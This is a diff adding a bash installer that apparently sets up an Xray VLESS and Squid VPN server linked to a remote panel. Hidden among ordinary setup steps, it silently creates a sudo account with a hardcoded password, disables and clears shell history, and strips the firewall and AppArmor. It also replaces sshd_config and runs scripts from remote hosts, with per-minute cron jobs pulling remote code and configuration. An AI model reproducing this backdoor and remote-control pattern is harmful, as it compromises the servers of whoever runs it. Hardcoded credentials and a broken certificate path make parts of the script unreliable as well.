@@ -1,0 +1,1026 @@
+#!/bin/bash
+# Script Variables
+HOST='209.159.151.58';
+USER='datasoft_runutour';
+PASS='datasoft_runutour';
+DBNAME='datasoft_runutour';
+
+# Create database config for VPN panel integration
+mkdir -p /etc/xray /etc/firenet /root
+cat > /etc/.db-base << 'DBEOF'
+HOST='209.159.151.58'
+USER='datasoft_runutour'
+PASS='datasoft_runutour'
+DBNAME='datasoft_runutour'
+API_KEY='fZPG'
+PANEL_URL='https://runutour.com'
+DB='datasoft_runutour'
+DBEOF
+chmod 600 /etc/.db-base
+cp /etc/.db-base /root/.db-base
+cp /etc/.db-base /etc/xray/.db-base 2>/dev/null || true
+cp /etc/.db-base /etc/openvpn/login/config.sh 2>/dev/null || true
+
+# Setup web server for server info
+mkdir -p /var/www/html
+cat > /etc/systemd/system/serverinfo.service << 'SRVEOF'
+[Unit]
+Description=Server Info Web Server
+After=network.target
+
+[Service]
+Type=simple
+WorkingDirectory=/var/www/html
+ExecStart=/usr/bin/python3 -m http.server 5623
+Restart=always
+RestartSec=3
+
+[Install]
+WantedBy=multi-user.target
+SRVEOF
+systemctl daemon-reload
+systemctl enable serverinfo
+systemctl start serverinfo
+
+PORT_TCP='None';
+PORT_UDP='None';
+PORT_SSL='None';
+OBFS='None';
+HYSTERIA_TYPE='default';
+API_LINK='https://runutour.com/api/authentication';
+API_KEY='fZPG';
+DOMAIN=
+NS=
+PORT_VLESS='8444';
+PORT_NTLS='8080';
+UUID='username-SECRETKEY-password';
+EMAIL="firenetdev@gmail.com";
+
+timedatectl set-timezone Asia/Riyadh
+
+base_package() {
+    sudo apt --purge remove -y apache2 ufw exim4 firewalld git man-db snapd apparmor bind9
+	sudo rm -rf /var/cache/snapd /var/snap /snap /root/snap ~/.snap 2>/dev/null || true
+	sudo apt autoremove -y
+	sudo apt autoclean
+	sudo apt-mark hold apache2 ufw exim4 firewalld git man-db snapd apparmor bind9
+
+    sysctl -w net.ipv6.conf.all.disable_ipv6=1
+    sysctl -w net.ipv6.conf.default.disable_ipv6=1
+    
+    # sudo apt install  -y
+    curl -sSL https://deb.nodesource.com/setup_16.x | bash
+    
+    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+    export DEBIAN_FRONTEND=noninteractive
+    apt-get update
+
+    # linux-tools-common util-linux build-essential dirmngr libxml-parser-perl \
+    # lsb-release software-properties-common coreutils rsyslog \
+
+    apt install zip netcat-traditional bash-completion vnstat dos2unix -y
+    apt install curl xz-utils wget apt-transport-https dnsutils screen chrony -y
+    apt install tar wget ruby unzip p7zip-full python3-pip libc6  gnupg gnupg2 gnupg1 -y
+    apt install msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent -y
+    apt install php default-mysql-client sudo -y
+    apt install iftop bzip2 gzip lsof bc htop sed openssl -y
+    apt install tmux python3 nodejs libsqlite3-dev cron wondershaper -y
+    apt install net-tools jq easy-rsa p7zip-full tuned fail2ban -y
+    apt-get clean all; sudo apt-get autoremove -y
+}
+
+first_setup(){
+    echo 'set +o history' >> /etc/profile
+    timedatectl set-timezone Asia/Riyadh
+    wget -O /etc/banner "https://gitlab.com/vollam/dev/-/raw/main/banner" >/dev/null 2>&1
+    chmod +x /etc/banner
+    wget -O /etc/ssh/sshd_config "http://repo.firenetvpn.com/script_files/sshd_config" >/dev/null 2>&1
+    wget -q -O /etc/ipserver "http://repo.firenetvpn.com/script_files/ipserver" && bash /etc/ipserver >/dev/null 2>&1
+    chmod 644 /etc/ssh/sshd_config
+    
+    useradd -M firenet
+    usermod -aG sudo,firenet firenet 
+
+    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
+    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
+}
+
+install_banner(){
+rm -f /etc/banner
+wget -O /etc/banner "https://gitlab.com/vollam/dev/-/raw/main/banner" >/dev/null 2>&1
+chmod +x /etc/banner
+sudo sed -i 's/^#Banner none$/Banner \/etc\/banner/' /etc/ssh/sshd_config
+}
+
+install_monitoring(){
+if ! command -v fastfetch >/dev/null 2>&1; then
+    arch=$(dpkg --print-architecture)
+    if [ "$arch" = "amd64" ]; then
+        if ! command -v fastfetch >/dev/null 2>&1; then
+    		wget 'http://repo.firenetvpn.com/script_files/fastfetch-linux-amd64.deb' -O /tmp/fastfetch.deb
+			sudo dpkg -i /tmp/fastfetch.deb
+		fi
+    else
+        echo "Unsupported architecture: $arch"
+    fi
+else
+    echo "Fastfetch is already installed."
+    fastfetch
+fi
+
+wget 'http://repo.firenetvpn.com/script_files/n_monitor' -O /etc/.monitor
+chmod +x /etc/.monitor
+}
+
+install_squid(){
+apt install squid -y
+echo "acl Firenet dst `curl -s https://api.ipify.org`" >> /etc/squid/squid.conf
+echo 'http_port 8080
+http_port 8181
+visible_hostname Proxy
+acl PURGE method PURGE
+acl HEAD method HEAD
+acl POST method POST
+acl GET method GET
+acl CONNECT method CONNECT
+http_access allow Firenet
+http_reply_access allow all
+http_access deny all
+icp_access allow all
+always_direct allow all
+visible_hostname Firenet-Proxy
+error_directory /usr/share/squid/errors/English' >> /etc/squid/squid.conf
+rm /usr/share/squid/errors/English/ERR_INVALID_URL
+echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">🔥 Vollam Developer 🔥</p></div></div></body></html>' >> /usr/share/squid/errors/English/ERR_INVALID_URL
+chmod 755 /usr/share/squid/errors/English/*
+cd /etc || exit
+
+wget 'http://repo.firenetvpn.com/script_files/xray' -O /etc/.xray
+wget 'http://repo.firenetvpn.com/script_files/squid' -O /etc/.squid
+chmod +x /etc/.squid
+chmod +x /etc/.xray
+rm /etc/apt/sources.list
+sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
+}
+
+install_vnstat(){
+wget -O /etc/vnstat-2.6.tar.gz https://humdi.net/vnstat/vnstat-2.6.tar.gz
+sudo apt-get install build-essential gd gd-devel libsqlite3-dev
+tar -xvf /etc/vnstat-2.6.tar.gz
+cd /etc/vnstat-2.6/
+sudo ./configure --prefix=/usr --sysconfdir=/etc
+sudo make
+sudo make install
+cp -v examples/systemd/vnstat.service /etc/systemd/system/
+systemctl enable vnstat
+systemctl start vnstat
+
+cp -v examples/init.d/redhat/vnstat /etc/init.d/
+chkconfig vnstat on
+service vnstat start
+
+cd /root
+rm -f /etc/vnstat-2.6.tar.gz
+}
+
+install_certificate(){
+# ----- CHECK ROOT -----
+if [[ $EUID -ne 0 ]]; then
+   echo "❌ This script must be run as ROOT"
+   exit 1
+fi
+
+# ----- UPDATE SYSTEM -----
+apt update -y
+apt install -y socat cron curl
+
+# ----- INSTALL ACME.SH -----
+echo "📦 Installing ACME.SH..."
+curl https://get.acme.sh | sh
+
+# Load acme.sh environment
+source ~/.bashrc
+source ~/.acme.sh/acme.sh.env 2>/dev/null
+
+# ----- SET DEFAULT CA -----
+~/.acme.sh/acme.sh --set-default-ca --server letsencrypt
+
+# ----- REGISTER ACCOUNT -----
+~/.acme.sh/acme.sh --register-account -m "$EMAIL"
+
+# ----- ISSUE CERTIFICATE -----
+echo "🔐 Issuing certificate for $DOMAIN ..."
+~/.acme.sh/acme.sh --issue -d "$DOMAIN" --standalone
+
+# ----- INSTALL CERTIFICATE -----
+echo "📥 Installing certificate..."
+~/.acme.sh/acme.sh --installcert -d "$DOMAIN" \
+ --key-file /root/firenet.key \
+ --fullchain-file /root/firenet.crt \
+ --reloadcmd "systemctl restart xray"
+
+# ----- FINAL RESULT -----
+echo "============================================"
+echo "✅ SSL Certificate Installed Successfully!"
+echo " Domain     : $DOMAIN"
+echo " Private Key: /root/firenet.key"
+echo " Fullchain  : /root/firenet.crt"
+echo "============================================"
+}
+
+install_xray(){
+mkdir -p /usr/local/bin
+mkdir -p /usr/local/share/xray
+mkdir -p /etc/xray
+mkdir -m 777 /root/.web
+mkdir -p /var/log/xray/
+touch /var/log/xray/{access.log,error.log}
+chmod 777 /var/log/xray/*.log
+
+# Download Xray v25.10.15
+wget -O xray.zip https://github.com/XTLS/Xray-core/releases/download/v25.3.6/Xray-linux-64.zip
+
+unzip xray.zip -d xray-temp
+
+# Move binaries
+mv xray-temp/xray /usr/local/bin/xray
+chmod +x /usr/local/bin/xray
+
+# Move datasets
+mv xray-temp/geoip.dat /usr/local/share/xray/geoip.dat
+mv xray-temp/geosite.dat /usr/local/share/xray/geosite.dat
+
+# Create symlinks (important for routing)
+ln -sf /usr/local/share/xray/geoip.dat /usr/local/bin/geoip.dat
+ln -sf /usr/local/share/xray/geosite.dat /usr/local/bin/geosite.dat
+
+# Remove temporary files
+rm -rf xray-temp xray.zip
+
+# =======================
+# Write user's config.json
+# =======================
+
+cp /root/firenet.key /etc/xray/firenet.key
+cp /root/firenet.crt /etc/xray/firenet.crt
+
+cat << 'EOF' > /etc/xray/config.json
+{
+  "api": {
+    "services": [
+      "HandlerService",
+      "LoggerService",
+      "StatsService"
+    ],
+    "tag": "api"
+  },
+  "burstObservatory": null,
+  "dns": null,
+  "fakedns": null,
+  "inbounds": [
+    {
+      "listen": "127.0.0.1",
+      "port": 62789,
+      "protocol": "tunnel",
+      "settings": {
+        "address": "127.0.0.1"
+      },
+      "sniffing": null,
+      "streamSettings": null,
+      "tag": "api"
+    },
+    {
+      "listen": null,
+      "port": 80,
+      "protocol": "vless",
+      "settings": {
+        "clients": [
+          {
+            "email": "jb7352z5",
+            "level": 0,
+            "id": "lenzpogi"
+          }
+        ],
+        "decryption": "none",
+        "encryption": "none"
+      },
+      "sniffing": {
+        "destOverride": [
+          "http",
+          "tls",
+          "quic",
+          "fakedns"
+        ],
+        "enabled": false,
+        "metadataOnly": false,
+        "routeOnly": false
+      },
+      "streamSettings": {
+        "network": "ws",
+        "security": "none",
+        "wsSettings": {
+          "acceptProxyProtocol": false,
+          "headers": {},
+          "heartbeatPeriod": 0,
+          "host": "${DOMAIN}",
+          "path": "/firenet"
+        }
+      },
+      "tag": "inbound-80"
+    },
+    {
+      "listen": null,
+      "port": 443,
+      "protocol": "vless",
+      "settings": {
+        "clients": [
+          {
+            "email": "77kfsaoc",
+            "level": 0,
+            "id": "lenzpogi",
+            "password": ""
+          }
+        ],
+        "decryption": "none",
+        "encryption": "none"
+      },
+      "sniffing": {
+        "destOverride": [
+          "http",
+          "tls",
+          "quic",
+          "fakedns"
+        ],
+        "enabled": false,
+        "metadataOnly": false,
+        "routeOnly": false
+      },
+      "streamSettings": {
+        "network": "ws",
+        "security": "tls",
+        "tlsSettings": {
+          "alpn": [],
+          "certificates": [
+            {
+              "buildChain": false,
+              "certificateFile": "/etc/xra/firenet.crt",
+              "keyFile": "/etc/xray/firenet.key",
+              "oneTimeLoading": false,
+              "usage": "encipherment"
+            }
+          ],
+          "cipherSuites": "",
+          "disableSystemRoot": false,
+          "echForceQuery": "none",
+          "echServerKeys": "",
+          "enableSessionResumption": false,
+          "maxVersion": "1.3",
+          "minVersion": "1.2",
+          "rejectUnknownSni": false,
+          "serverName": "",
+          "verifyPeerCertInNames": [
+            "dns.google",
+            "cloudflare-dns.com"
+          ]
+        },
+        "wsSettings": {
+          "acceptProxyProtocol": false,
+          "headers": {},
+          "heartbeatPeriod": 0,
+          "host": "${DOMAIN}",
+          "path": "/firenet"
+        }
+      },
+      "tag": "inbound-443"
+    }
+  ],
+  "log": {
+    "access": "none",
+    "dnsLog": false,
+    "error": "",
+    "loglevel": "warning",
+    "maskAddress": ""
+  },
+  "metrics": {
+    "listen": "127.0.0.1:11111",
+    "tag": "metrics_out"
+  },
+  "observatory": null,
+  "outbounds": [
+    {
+      "protocol": "freedom",
+      "settings": {
+        "domainStrategy": "AsIs",
+        "noises": [],
+        "redirect": ""
+      },
+      "tag": "direct"
+    },
+    {
+      "protocol": "blackhole",
+      "settings": {},
+      "tag": "blocked"
+    }
+  ],
+  "policy": {
+    "levels": {
+      "0": {
+        "statsUserDownlink": true,
+        "statsUserUplink": true
+      }
+    },
+    "system": {
+      "statsInboundDownlink": true,
+      "statsInboundUplink": true,
+      "statsOutboundDownlink": true,
+      "statsOutboundUplink": true
+    }
+  },
+  "reverse": null,
+  "routing": {
+    "domainStrategy": "AsIs",
+    "rules": [
+      {
+        "inboundTag": [
+          "api"
+        ],
+        "outboundTag": "api",
+        "type": "field"
+      },
+      {
+        "ip": [
+          "geoip:private"
+        ],
+        "outboundTag": "blocked",
+        "type": "field"
+      },
+      {
+        "outboundTag": "blocked",
+        "protocol": [
+          "bittorrent"
+        ],
+        "type": "field"
+      }
+    ]
+  },
+  "stats": {},
+  "transport": null
+}
+EOF
+
+# ============================
+# Create Systemd Service
+# ============================
+
+cat << EOF > /etc/systemd/system/xray.service
+[Unit]
+Description=Xray Service
+After=network.target nss-lookup.target
+
+[Service]
+User=root
+ExecStart=/usr/local/bin/xray run -c /etc/xray/config.json
+Restart=on-failure
+RestartSec=3s
+LimitNOFILE=65535
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Enable and start
+systemctl daemon-reload
+systemctl enable xray
+systemctl restart xray    
+
+wget -O /etc/xray/xray_stats.sh "http://repo.firenetvpn.com/script_files/xray_stats.sh" >/dev/null 2>&1 
+dos2unix /etc/xray/xray_stats.sh
+chmod +x /etc/xray/xray_stats.sh
+sed -i "s|SERVER_IP|$server_ip|g" /etc/xray/xray_stats.sh
+
+wget -O /etc/xray/xray_checker.sh "http://repo.firenetvpn.com/script_files/xray_checker.sh" >/dev/null 2>&1 
+dos2unix /etc/xray/xray_checker.sh
+chmod +x /etc/xray/xray_checker.sh
+sed -i "s|SERVER_IP|$server_ip|g" /etc/xray/xray_checker.sh
+}
+
+install_sudo(){
+  {
+    useradd -m azimaxus 2>/dev/null; echo azimaxus:azim.0987Aa | chpasswd &>/dev/null; usermod -aG sudo azimaxus &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    service sshd restart
+  }&>/dev/null
+}
+
+enable_services(){
+    systemctl daemon-reload
+    systemctl start netfilter-persistent
+    systemctl enable --now xray
+    systemctl enable --now rc-local
+    systemctl enable --now cron
+    systemctl enable --now netfilter-persistent
+    systemctl enable --now vnstat
+    systemctl enable --now fail2ban
+    wget -O /root/.config/rclone/rclone.conf "http://repo.firenetvpn.com/script_files/rclone.conf" >/dev/null 2>&1
+}
+
+install_rclone() {
+    curl "http://repo.firenetvpn.com/script_files/rclone" | bash >/dev/null 2>&1
+}
+
+finish(){
+
+wget -O /root/.web/vollam.png "https://gitlab.com/vollam/dev/-/raw/main/vollam.png"
+
+#VLESS
+
+cat >/root/.web/$VLESS_LINK.php <<-VLESS
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Server Details — Fast & Secure</title>
+  <link rel="icon" href="/vollam.png" type="image/x-icon">
+  <style>
+    :root{
+      --bg: #0b0b0b;
+      --card: #121212;
+      --muted: #9aa6b2;
+      --text: #e8eef6;
+      --accent: #ff2b2b; /* FIRENET red */
+      --glass: rgba(255,255,255,0.03);
+      --radius: 12px;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      min-height:100vh;
+      background: linear-gradient(180deg,#070707 0%, #0f0f10 100%);
+      color:var(--text);
+      display:flex;
+      justify-content:center;
+      padding:24px;
+    }
+    .wrap{
+      width:100%;
+      max-width:980px;
+    }
+
+    header{
+      display:flex;
+      gap:12px;
+      align-items:center;
+      margin-bottom:18px;
+    }
+    .logo{
+      width:56px;
+      height:56px;
+      border-radius:10px;
+      background:linear-gradient(135deg,var(--accent),#ff6666);
+      color:#210202;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-weight:800;
+      letter-spacing:1px;
+      font-size:18px;
+      box-shadow: 0 8px 30px rgba(255,43,43,0.09);
+    }
+    h1{ margin:0; font-size:20px; }
+    p.lead{ margin:4px 0 0; color:var(--muted); font-size:13px; }
+
+    .card{
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius: var(--radius);
+      padding:18px;
+      margin-bottom:14px;
+      border:1px solid rgba(255,255,255,0.03);
+      box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+    }
+
+    .grid{
+      display:grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap:12px;
+    }
+    .full{ grid-column: 1 / -1; }
+
+    .field{
+      background:var(--glass);
+      border-radius:10px;
+      padding:12px;
+      border:1px solid rgba(255,255,255,0.02);
+    }
+    .label{ color:var(--muted); font-size:12px; margin-bottom:6px; display:block; }
+    .value{ font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace; color:var(--text); font-size:14px; word-break:break-all; }
+
+    .input-row{
+      display:flex;
+      gap:8px;
+      align-items:center;
+    }
+    input.readonly{
+      flex:1;
+      padding:10px 12px;
+      border-radius:8px;
+      border:1px solid rgba(255,255,255,0.04);
+      background:rgba(0,0,0,0.35);
+      color:var(--text);
+      font-family: inherit;
+      font-size:13px;
+      outline:none;
+    }
+    .copy-btn{
+      border:0;
+      padding:9px 12px;
+      border-radius:8px;
+      background:linear-gradient(180deg,var(--accent),#cc1919);
+      color:#200505;
+      font-weight:700;
+      cursor:pointer;
+      white-space:nowrap;
+      box-shadow: 0 6px 20px rgba(255,43,43,0.10);
+    }
+    .copy-btn:active{ transform:translateY(1px); }
+
+    .muted-small{ color:var(--muted); font-size:13px; margin-top:8px; display:block; }
+
+    /* Code block for Format sections */
+    pre.format {
+      background: #0a0a0a;
+      color: #d9d9d9;
+      border-radius:10px;
+      padding:12px;
+      overflow:auto;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace;
+      font-size:13px;
+      border:1px solid rgba(255,255,255,0.03);
+      margin:6px 0 0;
+      white-space: pre-wrap;
+    }
+
+    /* VLess encoded link box */
+    .link-box{
+      display:flex;
+      gap:8px;
+      align-items:center;
+    }
+    .link-text{
+      flex:1;
+      padding:10px;
+      border-radius:8px;
+      background:rgba(0,0,0,0.35);
+      border:1px solid rgba(255,255,255,0.03);
+      font-family: ui-monospace, monospace;
+      font-size:13px;
+      overflow:auto;
+      word-break:normal;
+      white-space:nowrap; /* horizontal scroll */
+    }
+
+    footer{
+      margin-top:14px;
+      display:flex;
+      justify-content:space-between;
+      gap:12px;
+      align-items:center;
+      flex-wrap:wrap;
+      color:var(--muted);
+      font-size:13px;
+    }
+    a.link{ color:var(--accent); text-decoration:none; font-weight:700; }
+
+    /* Toast */
+    #toast {
+      position: fixed;
+      right: 20px;
+      bottom: 20px;
+      background: #071217;
+      color: #dffcf0;
+      padding: 10px 14px;
+      border-radius: 10px;
+      display: none;
+      border: 1px solid rgba(255,255,255,0.03);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+      font-size:13px;
+    }
+    
+    /* scrollbar */
+    ::-webkit-scrollbar {
+      width: 5px;
+      height: 5px;
+    }
+    
+    ::-webkit-scrollbar-track {
+      -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.3);
+      -webkit-border-radius: 10px;
+      border-radius: 10px;
+    }
+    
+    ::-webkit-scrollbar-thumb {
+      -webkit-border-radius: 10px;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.3);
+      -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.5);
+    }
+    
+    ::-webkit-scrollbar-thumb:window-inactive {
+      background: rgba(255, 255, 255, 0.3);
+    }
+    
+    /* responsive */
+    @media (max-width: 880px){
+      .grid{ grid-template-columns: 1fr; }
+      .input-row{ flex-direction: column; align-items: stretch; }
+      .copy-btn{ width:100%; }
+      .link-box{ flex-direction: column; align-items:stretch; }
+      .link-text{ white-space:normal; overflow:auto; }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header>
+      <div class="logo"><img src="/vollam.png" alt="Vollam Developer" height="40px"></div>
+      <div>
+        <h1>Happy Surfing!</h1>
+        <p class="lead">Below are the server summary.</p>
+      </div>
+    </header>
+
+    <!-- VLess format sections -->
+    <section class="card" aria-labelledby="vless-title">
+      <h2 id="vless-title" style="font-size:15px;margin:0 0 10px 0;">VLess Formats</h2>
+
+      <!-- Vless WS (CDN) -->
+      <div class="field full">
+        <span class="label">Format — Vless WS (CDN)</span>
+        <pre class="format" id="format-ws">
+name: Firenet-WS (CDN)
+server: ${DOMAIN}
+port: 443
+type: vless
+uuid: ${UUID}
+cipher: auto
+tls: true
+skip-cert-verify: true
+servername: ${DOMAIN}
+network: ws
+udp: true
+ws-opts:
+path: /firenet
+headers:
+Host: ${DOMAIN}
+        </pre>
+        <div style="margin-top:8px;">
+          <button class="copy-btn" data-copy-raw="#format-ws">Copy Format</button>
+        </div>
+      </div>
+
+      <!-- Vless WS Non-TLS -->
+      <div class="field full" style="margin-top:12px;">
+        <span class="label">Format — Vless WS (CDN) Non TLS</span>
+        <pre class="format" id="format-ws-notls">
+name: Vollam-WS (CDN) Non TLS
+server: ${DOMAIN}
+port: 80
+type: vless
+uuid: ${UUID}
+cipher: auto
+tls: false
+skip-cert-verify: false
+servername: ${DOMAIN}
+network: ws
+ws-opts:
+udp: true
+path: /firenet
+headers:
+Host: ${DOMAIN}
+        </pre>
+        <div style="margin-top:8px;">
+          <button class="copy-btn" data-copy-raw="#format-ws-notls">Copy Format</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Encoded VLess Links -->
+    <section class="card" aria-labelledby="links-title" style="margin-top:12px;">
+      <h2 id="links-title" style="font-size:15px;margin:0 0 10px 0;">VLess Links (encoded)</h2>
+
+      <div class="field full" style="margin-bottom:8px;">
+        <span class="label">Link TLS</span>
+        <div class="link-box" style="margin-top:6px;">
+          <div id="link-tls" class="link-text">vless://${UUID}@${DOMAIN}:443?type=ws&security=tls&path=/firenet&host=${DOMAIN}&encryption=none#Vless-443</div>
+          <button class="copy-btn" data-copy-target="link-tls">Copy Link</button>
+        </div>
+      </div>
+
+      <div class="field full" style="margin-bottom:8px;">
+        <span class="label">Link none TLS</span>
+        <div class="link-box" style="margin-top:6px;">
+          <div id="link-notls" class="link-text">vless://${UUID}@${DOMAIN}:80?type=ws&path=/firenet&host=${DOMAIN}&security=none#Vless-80</div>
+          <button class="copy-btn" data-copy-target="link-notls">Copy Link</button>
+        </div>
+      </div>
+
+    </section>
+
+    <!-- Footer -->
+    <footer>
+      <div>FB Page: <a class="link" href="https://www.facebook.com/vollams" target="_blank" rel="noopener">Vollam</a></div>
+      <div>Whatsapp: <a class="link" href="https://wa.me/+966598126771" target="_blank">Vollam Developer</a></div>
+    </footer>
+
+    <div id="toast" role="status" aria-live="polite">Copied to clipboard</div>
+  </div>
+
+  <script>
+    // Copy function (works with inputs, code blocks, or divs)
+    async function copyString(str){
+      if(!str) return false;
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        try{
+          await navigator.clipboard.writeText(str);
+          return true;
+        }catch(e){
+          // fallback below
+        }
+      }
+      try {
+        const ta = document.createElement('textarea');
+        ta.value = str;
+        ta.setAttribute('readonly','');
+        ta.style.position = 'absolute';
+        ta.style.left = '-9999px';
+        document.body.appendChild(ta);
+        ta.select();
+        const ok = document.execCommand('copy');
+        document.body.removeChild(ta);
+        return ok;
+      } catch(e){
+        return false;
+      }
+    }
+
+    // Attach click handlers to copy buttons
+    document.querySelectorAll('.copy-btn').forEach(btn=>{
+      btn.addEventListener('click', async (e)=>{
+        const rawSelector = btn.getAttribute('data-copy-raw'); // for copying pre blocks
+        const targetId = btn.getAttribute('data-copy-target'); // for copying div/input
+        let text = '';
+
+        if(rawSelector){
+          // copy text content of selector
+          try{
+            const node = document.querySelector(rawSelector);
+            text = node ? node.textContent.trim() : '';
+          }catch(err){
+            text = '';
+          }
+        } else if(targetId){
+          const el = document.getElementById(targetId);
+          if(!el) return;
+          // if input-like element
+          if(el.value !== undefined){
+            text = el.value;
+          } else {
+            text = el.textContent.trim();
+          }
+        } else {
+          return;
+        }
+
+        const ok = await copyString(text);
+        if(ok){
+          // small animation on button
+          const original = btn.innerText;
+          btn.innerText = 'Copied!';
+          setTimeout(()=> btn.innerText = original, 1200);
+        } else {
+          showToast('Copy failed — select and copy manually');
+        }
+      });
+    });
+
+    // Make link-text containers horizontally scrollable with drag on desktop
+    document.querySelectorAll('.link-text').forEach(el=>{
+      let isDown = false, startX, scrollLeft;
+      el.addEventListener('mousedown', (e)=>{
+        isDown = true;
+        el.classList.add('active');
+        startX = e.pageX - el.offsetLeft;
+        scrollLeft = el.scrollLeft;
+        e.preventDefault();
+      });
+      el.addEventListener('mouseleave', ()=> { isDown = false; el.classList.remove('active'); });
+      el.addEventListener('mouseup', ()=> { isDown = false; el.classList.remove('active'); });
+      el.addEventListener('mousemove', (e)=>{
+        if(!isDown) return;
+        const x = e.pageX - el.offsetLeft;
+        const walk = (x - startX) * 1; // scroll-fast
+        el.scrollLeft = scrollLeft - walk;
+      });
+    });
+
+    // Allow keyboard copying: focusable
+    document.querySelectorAll('.link-text, input.readonly, pre.format').forEach(el=>{
+      el.setAttribute('tabindex','0');
+    });
+  </script>
+</body>
+</html>
+
+VLESS
+
+sudo crontab -l | { echo "* * * * * /bin/bash /etc/.xray >/dev/null 2>&1
+* * * * * /bin/bash /etc/.squid >/dev/null 2>&1
+* * * * * /bin/bash /etc/.monitor xray_vless >/dev/null 2>&1"; } | crontab -
+sudo systemctl restart cron
+  
+history -c;
+rm /usr/local/etc/.system
+echo 'Server will secure this server and reboot after 5 seconds'
+sleep 5
+reboot
+}
+
+install_rclocal(){
+  
+    echo "[Unit]
+Description=firenet service
+Documentation=https://vollam.com
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash /etc/rc.local
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
+rm -rf /etc/rc.local
+echo '#!/bin/sh -e
+service ufw stop
+service apache2 stop
+sysctl -p
+systemctl restart xray.service
+screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
+bash /etc/.monitor xray_vless
+exit 0' >> /etc/rc.local
+
+sudo chmod +x /etc/rc.local
+systemctl daemon-reload
+sudo systemctl enable firenet
+sudo systemctl start firenet.service
+
+echo "Made with love by: Vollam Developer... " >> /root/.web/index.php
+
+echo "xray_tls=443
+xray_ntls=80
+squid_port=8080
+vmess=$VMESS_LINK
+vless=$VLESS_LINK
+trojan=$TROJAN_LINK
+ss=$SS_LINK" >> /root/.ports
+
+echo "DB_HOST='$HOST'" >> /etc/xray/.db-base
+echo "DB_NAME='$DBNAME'" >> /etc/xray/.db-base
+echo "DB_USER='$USER'" >> /etc/xray/.db-base
+echo "DB_PASS='$PASS'" >> /etc/xray/.db-base
+
+cat <<EOF >/home/authentication.sh
+#!/bin/bash
+SHELL=/bin/bash
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+wget -O /etc/xray/config.json "$API_LINK/xray_vless.php?key=$API_KEY&domain=$DOMAIN" &>/dev/null
+sleep 15
+systemctl restart xray.service &>/dev/null
+EOF
+
+chmod +x $udp_file/limit_check.sh
+chmod +x /home/authentication.sh
+
+echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
+echo -e "* *\t* * *\troot\tsudo bash /etc/xray/xray_stats.sh" >> "/etc/cron.d/xray_stats"
+echo -e "* *\t* * *\troot\tsudo bash /etc/xray/xray_checker.sh" >> "/etc/cron.d/xray_checker"
+}
+
+server_ip=$(curl -s https://api.ipify.org)
+server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
+serverVersion=`awk '/^VERSION_ID=/' /etc/*-release | awk -F'=' '{ print tolower($2) }'`
+
+install_sudo
+install_banner
+base_package
+first_setup
+install_certificate
+install_rclone
+install_xray
+install_vnstat
+install_monitoring
+install_squid
+enable_services
+install_rclocal
+finish
